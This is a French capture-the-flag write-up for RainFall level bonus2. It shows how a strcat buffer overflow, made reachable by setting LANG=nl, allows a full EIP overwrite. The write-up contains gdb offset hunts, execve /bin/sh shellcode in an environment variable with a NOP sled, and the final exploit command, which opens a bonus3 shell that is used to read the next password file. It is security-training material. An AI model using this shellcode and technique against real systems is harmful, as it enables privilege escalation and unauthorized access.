# Level Bonus2

Pour ce niveau le programme prends deux arguments et affiche un message de salutation en fonction de la variable d'environnement

Apres avoir reecrit une version plus lisible du programme on peut voir plusieurs choses

	- Une utilisation de strncpy qui encore une fois ne garantit pas d'avoir une chaine de caractere avec un caractere de terminaison a la fin
	- Une utilisation de strcat dans la fonction greetuser qui concatene une chaine de caractere plus grande que celle envoyer en parametre nous permettant de pouvoir faire un overflow de buffer pour ecraser EIP

L'executable n'ayant pas de fonction appelant un syscall pour pouvoir executer un shell on peut alors injecter un shellcode le meme utiliser dans les niveaux precedents en passant par une variable d'environnement

La particularite de ce niveau c'est qu'on a certaine condition en rapport avec les tailles de buffer et d'offset

Dans le cas par defaut:

```bash
(gdb) r aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa test
Starting program: /home/user/bonus2/bonus2 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa test
Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Breakpoint 1, 0x08048527 in greetuser ()
(gdb) p $ebp - 0x48
$1 = (void *) 0xbffff590
(gdb) x/32bx 0xbffff590
0xbffff590:	0x48	0x65	0x6c	0x6c	0x6f	0x20	0x61	0x61
0xbffff598:	0x61	0x61	0x61	0x61	0x61	0x61	0x61	0x61
0xbffff5a0:	0x61	0x61	0x61	0x61	0x61	0x61	0x61	0x61
0xbffff5a8:	0x61	0x61	0x61	0x61	0x61	0x61	0x61	0x61
(gdb) p $ebp - ($ebp - 0x48)
$2 = 72
(gdb) print ($ebp + 4) - ($ebp - 0x48)
$4 = 76
```

Bien que la distance buffer -> `EIP` soit de `76 octets` la chaine "Hello " ne fournit que `6 octets` de padding
L’input controle commence donc trop loin pour permettre un overwrite complet de l’`EIP`
En raison du point de depart trop éloigne de l’input et de la construction de `user_input` via deux `strncpy` l’écriture continue atteignable ne permet qu’un ecrasement partiel de l’`EIP` limite aux `2 octets` de poids faible et non aux `4`

```bash
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 28 + "ZZZZ"')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBZZZZ

Breakpoint 1, 0x08048527 in greetuser ()
(gdb) continue 
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x08005a5a in ?? ()
```

Dans le cas ou LANG=nl :

La distance du buffer et d'`EIP` ne change toujours pas mais la chaine "Goedemiddag! " fournissant un padding de `14 octets` rapproche notre input de `EIP` nous permettant un overwrite complet

Pour argv[1] nous allons utiliser un padding de `40 octets` pour ne pas avoir une chaine de caractere avec un `\0` cherchons plutot l'offset de argv[2]

```bash
(gdb) b *0x08048527
Breakpoint 1 at 0x8048527
(gdb) r $(python -c 'print "A" * 90') $(python -c 'print "0000111122223333444455556666777788889999"')
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 90') $(python -c 'print "0000111122223333444455556666777788889999"')
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA00001111222233334444555566667777

Breakpoint 1, 0x08048527 in greetuser ()
(gdb) continue 
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x36363635 in ?? ()
```

On voit bien que c'est au `24eme octets` qu'on arrive a ecraser `EIP` maintenant il nous reste plus qu'a injecter un shell code comme pour le niveau `bonus0`

```bash
bonus2@RainFall:~$ export SHELLCODE=$(python -c 'print "\x90" * 100 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
bonus2@RainFall:~$ cd /tmp/
bonus2@RainFall:/tmp$ ./getenv SHELLCODE
0xbffff8c1
```

Avec un decalage de `15 octets` pour s'assurer d'atterir dedans le `NOP SLED`
```bash
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\xbf\xff\xf8\xd0"[::-1]')
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB����
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
*********************************************************
$
```